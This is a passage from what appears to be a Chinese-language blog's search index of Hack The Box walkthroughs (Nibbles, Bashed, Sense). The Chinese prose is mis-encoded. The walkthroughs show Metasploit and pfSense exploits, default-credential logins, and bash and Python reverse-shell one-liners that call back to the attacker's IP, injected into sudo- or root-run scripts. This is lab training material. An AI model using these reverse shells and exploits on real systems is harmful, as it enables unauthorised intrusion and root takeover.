---------------------------------\nNibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                                             | php/remote/38489.rb\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n```\nçŸ¥é“äº† msf æœ‰ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´\n\n# æ¼æ´åˆ©ç”¨\n```bash\nmsf6 exploit(multi/http/nibbleblog_file_upload) > show options\n\nModule options (exploit/multi/http/nibbleblog_file_upload):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   PASSWORD   nibbles          yes       The password to authenticate with\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     10.10.10.75      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit\n   RPORT      80               yes       The target port (TCP)\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   TARGETURI  /nibbleblog/     yes       The base path to the web application\n   USERNAME   admin            yes       The username to authenticate with\n   VHOST                       no        HTTP server virtual host\n\nPayload options (php/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.9       yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Nibbleblog 4.0.3\n```\nè®¾ç½®å¥½ç›¸å…³çš„å‚æ•°ï¼Œç„¶å exploit æ‰§è¡Œ\n\n```bash\nmsf6 exploit(multi/http/nibbleblog_file_upload) > exploit\n\n[*] Started reverse TCP handler on 10.10.14.9:4444\n[*] Sending stage (39282 bytes) to 10.10.10.75\n[+] Deleted image.php\n[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.75:41138) at 2022-04-08 13:24:32 +0800\n\nmeterpreter > getuid\nServer username: nibbler (1001)\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª shell\n\n```bash\nshell\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\n```\næŒ‰ç…§è¿™äº›æµç¨‹è·å–ä¸€ä¸ªäº¤äº’å¼ shell\n\n```bash\nnibbler@Nibbles:/home/nibbler$ cat /home/nibbler/user.txt\ne8c44981255d5ccfaba9f1e2c343b6a1\n```\næˆåŠŸè·å¾— user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\nnibbler@Nibbles:/home/nibbler$ sudo -l\nMatching Defaults entries for nibbler on Nibbles:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser nibbler may run the following commands on Nibbles:\n    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n```\nä½¿ç”¨ sudo -l å‘ç°ä¸€ä¸ª sh è„šæœ¬å¯ä»¥ç”¨ root æƒé™æ‰§è¡Œ\n\n```bash\nnibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh\ncat: /home/nibbler/personal/stuff/monitor.sh: No such file or directory\n```\næŸ¥çœ‹æ˜¾ç¤ºæ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œå»æµè§ˆä¸€ä¸‹\n\n```bash\nnibbler@Nibbles:/home/nibbler$ ls -la\ntotal 20\ndrwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .\ndrwxr-xr-x 3 root    root    4096 Dec 10  2017 ..\n-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history\ndrwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano\n-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip\n-r-------- 1 nibbler nibbler   33 Apr  8 01:20 user.txt\n```\næ˜¯ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œå»è‡ªå·±è§£å‹å‡ºæ¥\n\n```bash\nnibbler@Nibbles:/home/nibbler$ unzip personal.zip\nArchive:  personal.zip\n   creating: personal/\n   creating: personal/stuff/\n  inflating: personal/stuff/monitor.sh\n```\nç„¶åå†å»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nnibbler@Nibbles:/home/nibbler$ cat /home/nibbler/personal/stuff/monitor.sh\n                  ####################################################################################################\n                  #                                        Tecmint_monitor.sh                                        #\n                  # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #\n                  # If any bug, report us in the link below                                                          #\n                  # Free to use/edit/distribute the code below by                                                    #\n                  # giving proper credit to Tecmint.com and Author                                                   #\n                  #                                                                                                  #\n                  ####################################################################################################\n#! /bin/bash\n# unset any variable which system may be using\n\n# clear the screen\nclear\n\nunset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage\n\nwhile getopts iv name\ndo\n        case $name in\n          i)iopt=1;;\n          v)vopt=1;;\n          *)echo \"Invalid arg\";;\n        esac\ndone\n\nif [[ ! -z $iopt ]]\nthen\n{\nwd=$(pwd)\nbasename \"$(test -L \"$0\" && readlink \"$0\" || echo \"$0\")\" > /tmp/scriptname\nscriptname=$(echo -e -n $wd/ && cat /tmp/scriptname)\nsu -c \"cp $scriptname /usr/bin/monitor\" root && echo \"Congratulations! Script Installed, now run monitor Command\" || echo \"Installation failed\"\n}\nfi\n\nif [[ ! -z $vopt ]]\nthen\n{\necho -e \"tecmint_monitor version 0.1\\nDesigned by Tecmint.com\\nReleased Under Apache 2.0 License\"\n}\nfi\n\nif [[ $# -eq 0 ]]\nthen\n{\n\n# Define Variable tecreset\ntecreset=$(tput sgr0)\n\n# Check if connected to Internet or not\nping -c 1 google.com &> /dev/null && echo -e '\\E[32m'\"Internet: $tecreset Connected\" || echo -e '\\E[32m'\"Internet: $tecreset Disconnected\"\n\n# Check OS Type\nos=$(uname -o)\necho -e '\\E[32m'\"Operating System Type :\" $tecreset $os\n\n# Check OS Release Version and Name\ncat /etc/os-release | grep 'NAME\\|VERSION' | grep -v 'VERSION_ID' | grep -v 'PRETTY_NAME' > /tmp/osrelease\necho -n -e '\\E[32m'\"OS Name :\" $tecreset  && cat /tmp/osrelease | grep -v \"VERSION\" | cut -f2 -d\\\"\necho -n -e '\\E[32m'\"OS Version :\" $tecreset && cat /tmp/osrelease | grep -v \"NAME\" | cut -f2 -d\\\"\n\n# Check Architecture\narchitecture=$(uname -m)\necho -e '\\E[32m'\"Architecture :\" $tecreset $architecture\n\n# Check Kernel Release\nkernelrelease=$(uname -r)\necho -e '\\E[32m'\"Kernel Release :\" $tecreset $kernelrelease\n\n# Check hostname\necho -e '\\E[32m'\"Hostname :\" $tecreset $HOSTNAME\n\n# Check Internal IP\ninternalip=$(hostname -I)\necho -e '\\E[32m'\"Internal IP :\" $tecreset $internalip\n\n# Check External IP\nexternalip=$(curl -s ipecho.net/plain;echo)\necho -e '\\E[32m'\"External IP : $tecreset \"$externalip\n\n# Check DNS\nnameservers=$(cat /etc/resolv.conf | sed '1 d' | awk '{print $2}')\necho -e '\\E[32m'\"Name Servers :\" $tecreset $nameservers\n\n# Check Logged In Users\nwho>/tmp/who\necho -e '\\E[32m'\"Logged In users :\" $tecreset && cat /tmp/who\n\n# Check RAM and SWAP Usages\nfree -h | grep -v + > /tmp/ramcache\necho -e '\\E[32m'\"Ram Usages :\" $tecreset\ncat /tmp/ramcache | grep -v \"Swap\"\necho -e '\\E[32m'\"Swap Usages :\" $tecreset\ncat /tmp/ramcache | grep -v \"Mem\"\n\n# Check Disk Usages\ndf -h| grep 'Filesystem\\|/dev/sda*' > /tmp/diskusage\necho -e '\\E[32m'\"Disk Usages :\" $tecreset\ncat /tmp/diskusage\n\n# Check Load Average\nloadaverage=$(top -n 1 -b | grep \"load average:\" | awk '{print $10 $11 $12}')\necho -e '\\E[32m'\"Load Average :\" $tecreset $loadaverage\n\n# Check System Uptime\ntecuptime=$(uptime | awk '{print $3,$4}' | cut -f1 -d,)\necho -e '\\E[32m'\"System Uptime Days/(HH:MM) :\" $tecreset $tecuptime\n\n# Unset Variables\nunset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage\n\n# Remove Temporary Files\nrm /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage\n}\nfi\nshift $(($OPTIND -1))\n```\næˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„æƒé™ç»„\n\n```bash\nnibbler@Nibbles:/home/nibbler$ ls -la /home/nibbler/personal/stuff/monitor.sh\n-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 /home/nibbler/personal/stuff/monitor.sh\n```\n777 æƒé™ï¼Œé‚£å°±ç®€å•äº†ï¼Œå†™å…¥ä¸€æ®µæŸ¥çœ‹ flag çš„è¯­å¥ç„¶åæ‰§è¡Œ\n\n```bash\nnibbler@Nibbles:/home/nibbler/personal/stuff$ echo 'cat /root/root.txt' > monitor.sh\nnibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh\n48716e5e4fa73411376fb8ee5f037bed\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶\n\nå¦‚æœæˆ‘ä»¬å‘æ‹¿åˆ° root æƒé™çš„ shellï¼Œé‚£å°±å»å†™å…¥ä¸€ä¸ªåå¼¹è¯­å¥\n\nä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 5555\n```\n```bash\necho '/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.9/5555 0>&1\"' > monitor.sh\n```\nå†™å…¥è¯­å¥åæ‰§è¡Œ\n\n```bash\nsudo ./ monitor.sh\n```\n```bash\nroot@Nibbles:/home/nibbler/personal/stuff# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸæ‹¿åˆ° root æƒé™","tags":["Hackthebox"]},{"title":"Bashed - Hackthebox","url":"/2022/04/08/Hackthebox/Easy/Hackthebox-Bashed/","content":"\n# Hackthebox - Bashed\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Bashed/2d1d57ff-7137-4e2b-a021-cd676d088ebf.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Bashed/bb16ca3f-9e06-4663-9e7b-744ea47889dc.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Bashed]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.68\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-07 20:51 EDT\nNmap scan report for 10.10.10.68\nHost is up (0.27s latency).\nNot shown: 65534 closed ports\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Arrexel's Development Site\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/7%OT=80%CT=1%CU=37395%PV=Y%DS=2%DC=T%G=Y%TM=624F8737\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=Z%CI=RD%II=I%TS=A)SEQ\nOS:(SP=F8%GCD=1%ISR=104%TI=Z%TS=A)SEQ(SP=101%GCD=1%ISR=107%TI=Z%II=I%TS=B)S\nOS:EQ(SP=F9%GCD=1%ISR=103%TI=Z%CI=RD%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7\nOS:%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=7120%W\nOS:2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NN\nOS:SNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y\nOS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR\nOS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40\nOS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G\nOS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   229.69 ms 10.10.14.1\n2   229.83 ms 10.10.10.68\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.00 seconds\n```\n## Http\n![](Hackthebox-Bashed/4b0111f1-b9e8-4966-98c5-68d721e2f2f2.png)\n\nçœ‹ç€ä¼¼ä¹åƒæ˜¯ä¸€ä¸ªåšå®¢ï¼Œå»éšä¾¿çœ‹çœ‹\n\n![](Hackthebox-Bashed/a6074b6f-fc26-4a45-8575-02ea42a3700b.png)\n\nè¿™é‡Œæç¤ºä½¿ç”¨äº† Arrexel çš„ phpbashï¼Œç„¶åç»™äº†ä¸€ä¸ªåœ°å€\n\n/uploads/phpbash.php\n\nä½†æ˜¯è®¿é—®åä¸å­˜åœ¨ï¼Œå»åšä¸ª fuzz å§\n\n## Fuzz\n```bash\ngobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error\n\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.10.10.68\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Timeout:                 10s\n===============================================================\n2022/04/08 09:01:23 Starting gobuster in directory enumeration mode\n===============================================================\n/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]\n/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]\n/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]\n/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]\n/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]\n/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]\n/server-status        (Status: 403) [Size: 299]\n\n===============================================================\n2022/04/08 09:04:55 Finished\n===============================================================\n```\n![](Hackthebox-Bashed/5eb82d96-d315-4aca-a785-08e537d37edc.png)\n\nåœ¨ dev ä¸‹æ‰¾åˆ°äº†æˆ‘ä»¬è¦çš„ä¸œè¥¿\n\n# æ¼æ´åˆ©ç”¨\n![](Hackthebox-Bashed/61b2119e-3955-4e84-bbb6-680b01b30240.png)\n\nç¡®è®¤å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£å°±æ¥åå¼¹ä¸€ä¸ª bashshell å§\n\nä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nlvp 4444\n```\nç„¶åä¸‹è½½ä¸€ä¸ª åå‘çš„ phpshell\n\n> [https://raw.githubusercontent.com/LucifielHack/TTY-Reverse-Shell-PHP/master/revshell.php](https://raw.githubusercontent.com/LucifielHack/TTY-Reverse-Shell-PHP/master/revshell.php)\n\nç„¶åä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡å™¨\n\n```bash\npython3 -m http.server 80\n```\nç„¶ååœ¨ phpbash é‡Œä½¿ç”¨ wget è¿›è¡Œä¸‹è½½\n\n```bash\nwww-data@bashed:/var/www/html/uploads# wget http://10.10.14.9/revshell.php\n--2022-04-07 19:03:56-- http://10.10.14.9/revshell.php\nConnecting to 10.10.14.9:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 4479 (4.4K) [application/octet-stream]\nSaving to: 'revshell.php'\n\n0K .... 100% 443M=0s\n\n2022-04-07 19:03:56 (443 MB/s) - 'revshell.php' saved [4479/4479]\n```\næ¥ç€è®¿é—®ä¸€ä¸‹ revshell.phpï¼ˆéœ€è¦åœ¨ uploads ç›®å½•ä¸‹ï¼Œå¦åˆ™æ²¡å†™å…¥æƒé™ï¼‰\n\n```bash\ncurl http://10.10.10.68/uploads/revshell.php\n```\n```bash\n$ whoami&&id\nwww-data\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸè·å¾—ä¸€ä¸ª shell\n\n```bash\n$ cat /home/arrexel/user.txt\n2c281f318555dbc1b856957c7147bfc1\n```\næˆåŠŸè·å¾— user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n```bash\n$ sudo -l\nMatching Defaults entries for www-data on bashed:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser www-data may run the following commands on bashed:\n    (scriptmanager : scriptmanager) NOPASSWD: ALL\n```\nä½¿ç”¨ sudo -l æŸ¥çœ‹æƒé™åï¼Œå‘ç°å¯ä»¥ä½¿ç”¨ scriptmanager ç”¨æˆ·çš„æƒé™æŒ‡ä»¤ä»»ä½•å‘½ä»¤\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\nCtrl+Zè¿”å›\nstty raw -echo; fg\nexport TERM=xterm\nstty rows 51 cols 237\n```\né¦–å…ˆè·å¾—ä¸€ä¸ªäº¤äº’å¼ bashï¼Œå¹¶ä¸”ä¿®å¤ä¸€ä¸‹\n\n```bash\nsudo -u scriptmanager bash\n```\nç„¶åä½¿ç”¨ sudo -u æ¥ä½¿ç”¨ scriptmanager ç”¨æˆ·æ‰§è¡Œ bash æŒ‡ä»¤\n\n```bash\nscriptmanager@bashed:/$ whoami\nwhoami\nscriptmanager\n```\næˆåŠŸè¿›å…¥ scriptmanager çš„ bash\n\n```bash\nscriptmanager@bashed:/$ ls\nls\nbin   etc         lib         media  proc  sbin     sys  var\nboot  home        lib64       mnt    root  scripts  tmp  vmlinuz\ndev   initrd.img  lost+found  opt    run   srv      usr\n```\nè¿™é‡Œå‘ç°æ ¹ç›®å½•ä¸‹æœ‰ä¸€ä¸ªä¸æ­£å¸¸çš„ scripts ç›®å½•ï¼Œè¿›å»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nscriptmanager@bashed:/scripts$ ls -la\nls -la\ntotal 16\ndrwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .\ndrwxr-xr-x 23 root          root          4096 Dec  4  2017 ..\n-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py\n-rw-r--r--  1 root          root            12 Apr  7 19:21 test.txt\n```\nè¿™é‡Œæœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ª test.py æˆ‘ä»¬å¯ä»¥è¿è¡Œï¼Œä¸€ä¸ª test.txt æ˜¯ root è´¦æˆ·çš„æ–‡ä»¶ï¼Œå¹¶ä¸” test.txt ä¼¼ä¹æœ€è¿‘åˆšè¢«ä¿®æ”¹è¿‡\n\n```bash\nscriptmanager@bashed:/scripts$ cat test.txt\ncat test.txt\ntesting 123!\n```\nä¼¼ä¹æ²¡ä»€ä¹ˆå†…å®¹\n\n```bash\nscriptmanager@bashed:/scripts$ cat test.py\ncat test.py\nf = open(\"test.txt\", \"w\")\nf.write(\"testing 123!\")\nf.close\n```\nè¿™ä¸ªè„šæœ¬ä¼šå‘ test.txt å†™å…¥å†…å®¹ï¼Œé‚£å°±å¥½åŠäº†ï¼Œç¯¡æ”¹ä¸€ä¸‹å†…å®¹\n\n```bash\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\n```\nç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 5555\n```\næ¥ç€ç­‰å¾…ä¸€ä¼šå„¿\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel/Desktop]\nâ””â”€# nc -nvlp 5555                                                                                                                                                                        130 â¨¯\nlistening on [any] 5555 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.68] 35106\n/bin/sh: 0: can't access tty; job control turned off\n# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\næˆåŠŸæ‹¿åˆ° root æƒé™\n\n```bash\n# cat /root/root.txt\ncc4f0afe3a1026d402ba10329674a8e2\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Sense- Hackthebox","url":"/2022/04/07/Hackthebox/Easy/Hackthebox-Sense/","content":"\n# Hackthebox - Sense\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Sense/7b55e2a0-8a6b-4396-abfe-a35f836f23bf.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Sense/732171a8-afaf-4839-811a-d64164e9b802.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.60\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-07 00:43 EDT\nNmap scan report for 10.10.10.60\nHost is up (0.30s latency).\nNot shown: 65533 filtered ports\nPORT    STATE SERVICE    VERSION\n80/tcp  open  http       lighttpd 1.4.35\n|_http-title: Did not follow redirect to https://10.10.10.60/\n443/tcp open  ssl/https?\n| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US\n| Not valid before: 2017-10-14T19:21:35\n|_Not valid after:  2023-04-06T19:21:35\n|_ssl-date: TLS randomness does not represent time\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: specialized|general purpose\nRunning (JUST GUESSING): Comau embedded (92%), FreeBSD 8.X (85%), OpenBSD 4.X (85%)\nOS CPE: cpe:/o:freebsd:freebsd:8.1 cpe:/o:openbsd:openbsd:4.3\nAggressive OS guesses: Comau C4G robot control unit (92%), FreeBSD 8.1 (85%), OpenBSD 4.3 (85%), OpenBSD 4.0 (85%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   313.22 ms 10.10.14.1\n2   313.26 ms 10.10.10.60\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 65.91 seconds\n```\n## Http\n![](Hackthebox-Sense/86fc3ada-fba6-45ba-982e-03504c5f2dc6.png)\n\næ˜¯ä¸€å° pfsenseï¼Œå…·ä½“çš„ç‰ˆæœ¬ä¸æ˜\n\næµ‹è¯•äº†ä¸€ä¸‹å¼±å£ä»¤ï¼Œæ²¡æœ‰æˆåŠŸ\n\nå» fuzz ä¸€ä¸‹\n\n## fuzz\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense]\nâ””â”€# gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt -t 200\n===============================================================\nGobuster v3.1.0\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     https://10.10.10.60\n[+] Method:                  GET\n[+] Threads:                 200\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.1.0\n[+] Extensions:              txt\n[+] Timeout:                 10s\n===============================================================\n2022/04/07 16:05:38 Starting gobuster in directory enumeration mode\n===============================================================\n/themes               (Status: 301) [Size: 0] [--> https://10.10.10.60/themes/]\n/css                  (Status: 301) [Size: 0] [--> https://10.10.10.60/css/]\n/includes             (Status: 301) [Size: 0] [--> https://10.10.10.60/includes/]\n/javascript           (Status: 301) [Size: 0] [--> https://10.10.10.60/javascript/]\n/changelog.txt        (Status: 200) [Size: 271]\n/classes              (Status: 301) [Size: 0] [--> https://10.10.10.60/classes/]\n/widgets              (Status: 301) [Size: 0] [--> https://10.10.10.60/widgets/]\n/tree                 (Status: 301) [Size: 0] [--> https://10.10.10.60/tree/]\n/shortcuts            (Status: 301) [Size: 0] [--> https://10.10.10.60/shortcuts/]\n/installer            (Status: 301) [Size: 0] [--> https://10.10.10.60/installer/]\n/wizards              (Status: 301) [Size: 0] [--> https://10.10.10.60/wizards/]\n/csrf                 (Status: 301) [Size: 0] [--> https://10.10.10.60/csrf/]\n/system-users.txt     (Status: 200) [Size: 106]\n/filebrowser          (Status: 301) [Size: 0] [--> https://10.10.10.60/filebrowser/]\n/%7Echeckout%7E       (Status: 403) [Size: 345]\n\n===============================================================\n2022/04/07 16:12:30 Finished\n===============================================================\n```\nè¿™é‡Œçœ‹åˆ°æœ‰ä¸¤ä¸ª txt æ–‡ä»¶ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nhttps://10.10.10.60/changelog.txt\n\n# Security Changelog \n\n### Issue\nThere was a failure in updating the firewall. Manual patching is therefore required\n\n### Mitigated\n2 of 3 vulnerabilities have been patched.\n\n### Timeline\nThe remaining patches will be installed during the next maintenance window\n```\n```bash\nhttps://10.10.10.60/system-users.txt\n\n####Support ticket###\n\nPlease create the following user\n\nusername: Rohit\npassword: company defaults\n```\nç¬¬ä¸€ä¸ªæ–‡ä»¶è¯´å‘ç°äº†ä¸‰ä¸ªæ¼æ´ï¼Œå·²ç»ä¿®å¤äº†å…¶ä¸­ä¸¤ä¸ªï¼Œé‚£å°±æ˜¯è¿˜æœ‰ä¸€ä¸ª\n\nç¬¬äºŒä¸ªæ–‡ä»¶å‘Šè¯‰æˆ‘ä»¬æœ‰ä¸€ä¸ªè´¦å· Rohitï¼Œå¯†ç æ˜¯ pfSenseçš„é»˜è®¤å¯†ç \n\nå»æœç´¢ä¸€ä¸‹é»˜è®¤å¯†ç \n\n![](Hackthebox-Sense/4c1026cc-659b-43b5-96f6-2b15da3b7965.png)\n\n![](Hackthebox-Sense/1e571e0e-7ef9-4a7e-8ee2-071166c9b1c8.png)\n\nå¾—åˆ°äº†ä¸€ä¸ªè´¦æˆ·å¯†ç \n\n```bash\nusername = rohit\npassword = pfsense\n```\n# æ¼æ´åˆ©ç”¨\nç°åœ¨å»ç™»å½•\n\n![](Hackthebox-Sense/93f41927-92f2-4f4e-9399-30bdc5b8ab76.png)\n\nç™»å…¥åå¯ä»¥çœ‹åˆ°ï¼Œå½“å‰ç‰ˆæœ¬æ˜¯ pfSense2.1.3\n\nå»æŸ¥æ‰¾ä¸€ä¸‹æ˜¯å¦æœ‰æ¼æ´\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense]\nâ””â”€# searchsploit pfSense2.1.3\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                                                                                    |  Path\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\npfSense< 2.1.4 - 'status_rrd_graph_img.php' Command Injection                                                                                                                    | php/webapps/43560.py\n---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\nPapers: No Results\n```\nè¿˜çœŸæ‰¾åˆ°ä¸€ä¸ª\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense]\nâ””â”€# locate php/webapps/43560.py\n/usr/share/exploitdb/exploits/php/webapps/43560.py\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Sense]\nâ””â”€# cp /usr/share/exploitdb/exploits/php/webapps/43560.py ./exploit.py\n```\næŠŠ exploit ç»™å¤åˆ¶è¿‡æ¥\n\nä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\n```\nç„¶åå»æ‰§è¡Œ exploit\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                      \nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.10.60] 65102\nsh: can't access tty; job control turned off\n# whoami&&id\nroot\nuid=0(root) gid=0(wheel) groups=0(wheel)\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ shell\n\n```bash\n# cat /home/rohit/user.txt\n8721327cc232073b40d27d9c17e7348b\n\n# cat /root/root.txt\nd08c32a5d4f8c8b10e76eb51a69f1a86\n```\næ‹¿åˆ° user æƒé™ å’Œ root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Catch - Hackthebox","url":"/2022/04/06/Hackthebox/Medium/Hackthebox-Catch/","content":"\n# Hackthebox - Catch\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Catch/65260f4c-a8f4-4590-98d3-0cf1c7499d25.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Catch/1a78fc9e-7749-4dc0-be31-1e9428864b39.png)\n\n# ä¿¡æ¯æœé›†\n## 